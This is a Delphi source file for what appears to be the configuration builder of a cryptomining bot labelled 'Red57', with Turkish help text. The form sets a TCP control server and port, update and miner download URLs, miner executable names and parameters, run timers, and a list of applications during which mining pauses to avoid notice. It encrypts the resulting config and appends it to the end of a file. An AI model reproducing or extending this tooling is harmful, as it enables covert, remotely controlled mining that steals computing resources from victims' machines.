unit NewUpdate;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, uEnc, uEof, Buttons, ExtCtrls;

type
  TFormNewUpdate = class(TForm)
    GroupBox1: TGroupBox;
    Label1: TLabel;
    ClientVersion: TEdit;
    Label2: TLabel;
    TCPPORT: TEdit;
    Label3: TLabel;
    TCPTIMER: TEdit;
    KapatButton: TButton;
    CreateConfig: TButton;
    TCPIP: TEdit;
    Label5: TLabel;
    Label4: TLabel;
    Label6: TLabel;
    ClientUpdateTimer: TEdit;
    TCPEXEURL: TEdit;
    MinVer: TEdit;
    MinExeURL: TEdit;
    MinTimer: TEdit;
    Label7: TLabel;
    Label8: TLabel;
    Label9: TLabel;
    Label10: TLabel;
    Label11: TLabel;
    Label12: TLabel;
    MinX86ExeName: TEdit;
    Label13: TLabel;
    Minx64ExeName: TEdit;
    Label14: TLabel;
    SD: TSaveDialog;
    MinEnable: TRadioButton;
    MinEnableE: TRadioButton;
    MinEnableD: TRadioButton;
    SpeedButton1: TSpeedButton;
    SpeedButton2: TSpeedButton;
    SpeedButton3: TSpeedButton;
    SpeedButton4: TSpeedButton;
    SpeedButton5: TSpeedButton;
    SpeedButton6: TSpeedButton;
    SpeedButton7: TSpeedButton;
    SpeedButton8: TSpeedButton;
    SpeedButton9: TSpeedButton;
    SpeedButton10: TSpeedButton;
    SpeedButton11: TSpeedButton;
    SpeedButton12: TSpeedButton;
    SpeedButton13: TSpeedButton;
    SpeedButton14: TSpeedButton;
    MnrBlacklist: TEdit;
    Label15: TLabel;
    MinParamD: TMemo;
    MinParamL: TMemo;
    Label16: TLabel;
    Panel1: TPanel;
    TCPDisable: TRadioButton;
    TCPEnable: TRadioButton;
    procedure KapatButtonClick(Sender: TObject);
    procedure CreateConfigClick(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure SpeedButton6Click(Sender: TObject);
    procedure SpeedButton8Click(Sender: TObject);
    procedure SpeedButton9Click(Sender: TObject);
    procedure SpeedButton12Click(Sender: TObject);
    procedure SpeedButton13Click(Sender: TObject);
    procedure SpeedButton3Click(Sender: TObject);
    procedure SpeedButton14Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FormNewUpdate: TFormNewUpdate;

implementation

uses StrUtils;

{$R *.dfm}

function MyReturnResToText(ResName: string): string;
var
  RS: TResourceStream;
begin
  if FindResource(HInstance, PChar(ResName), RT_RCDATA) <> 0 then
  begin
    RS := TResourceStream.Create(HInstance, ResName, RT_RCDATA);
    SetLength(Result, RS.Size);
    RS.ReadBuffer(Result[1], RS.Size);
  end
  else
    Result := '0';
end; {* MyReturnResToText -> Resleri String Olarak Döndürür *}

procedure AddList(SL: TStringList; Key, Value : String);
begin
  if Value <> '' then
    SL.Add(Key + Value);
end;

procedure AddListTimer(SL: TStringList; Key, Value : String);
begin
  if Value <> '' then
    SL.Add(Key + IntToStr(StrToInt(Value) * 60000));
end;

procedure TFormNewUpdate.CreateConfigClick(Sender: TObject);
var
  SL: TStringList;
begin
  // Create List
  SL := TStringList.Create;

  with SL do begin
    // Add TCP Settings
    AddList(SL, '', '[CS]');
    AddList(SL, 'VER=', ClientVersion.Text);
    if TCPEnable.Checked then AddList(SL, 'TCPENB=', BoolToStr(True))
    else if TCPDisable.Checked then AddList(SL, 'TCPENB=', BoolToStr(False));
    AddList(SL, 'TCP=', TCPIP.Text);
    AddList(SL, 'TCPPORT=', TCPPORT.Text);
    AddListTimer(SL, 'TCPTMR=', TCPTIMER.Text);
    AddList(SL, 'EXEURL=', TCPEXEURL.Text);
    AddListTimer(SL, 'UTMR=', ClientUpdateTimer.Text);

    // Add Mining Settings
    AddList(SL, '',  '[MNG]');
    if MinEnableE.Checked then AddList(SL, 'Enable=', BoolToStr(True))
    else if MinEnableD.Checked then AddList(SL, 'Enable=', BoolToStr(False));
    AddList(SL, 'RgUrl=', MinExeURL.Text);
    AddList(SL, 'Version=', MinVer.Text);
    AddListTimer(SL, 'RunTimer=', MinTimer.Text);
    AddList(SL, 'RunParam=', EN(Trim(MinParamD.Text)));
    AddList(SL, 'RunParamL=', EN(Trim(MinParamL.Text)));
    AddList(SL, 'E32Name=', MinX86ExeName.Text);
    AddList(SL, 'E64Name=', Minx64ExeName.Text);
    AddList(SL, 'Black=', MnrBlacklist.Text);
  end;

  // Save
  if SD.Execute then begin
    EofWrt(SD.FileName, EN(Trim(SL.Text)))
  end;

  SL.Free;
end;

procedure TFormNewUpdate.KapatButtonClick(Sender: TObject);
begin
  Close;
end; { KapatButtonClick -> Kapat }

procedure TFormNewUpdate.SpeedButton1Click(Sender: TObject);
begin
  ShowMessage('URL adresinde HTTP kullanmayýn. ex.mooo.com || 43.66.44.77/min ');
end;

procedure TFormNewUpdate.SpeedButton2Click(Sender: TObject);
begin
  ShowMessage('Mining 32/64 bit .exe dosya adý, güncelleme sonrasý çalýþtýrýlýr.');
end;

procedure TFormNewUpdate.SpeedButton6Click(Sender: TObject);
begin
  ShowMessage('Mining 32/64 bit .exe çalýþtýrma parametreleridir.');
end;

procedure TFormNewUpdate.SpeedButton8Click(Sender: TObject);
begin
  ShowMessage('Tekrar denetleme süresi, dakika olarak girin. Sadece sayý girebilirsiniz.');
end;

procedure TFormNewUpdate.SpeedButton9Click(Sender: TObject);
begin
  ShowMessage('Mining sürüm denetleme numarasý');
end;

procedure TFormNewUpdate.SpeedButton12Click(Sender: TObject);
begin
  ShowMessage('TCP baðlantý portu, varsayýlan 1200 ayarlýdýr.');
end;

procedure TFormNewUpdate.SpeedButton13Click(Sender: TObject);
begin
  ShowMessage('TCP baðlantý adresidir, http kullanmayýn.');
end;

procedure TFormNewUpdate.SpeedButton3Click(Sender: TObject);
begin
  ShowMessage('Red57 Sürümü Numarasý, mevcut derleme sürümü 110');
end;

procedure TFormNewUpdate.SpeedButton14Click(Sender: TObject);
begin
  ShowMessage('Minerin çalýþtýrýlmayacaðý engelli uygulama adlarý. "," ile birden fazla kelime girilebilir.');
end;

end.

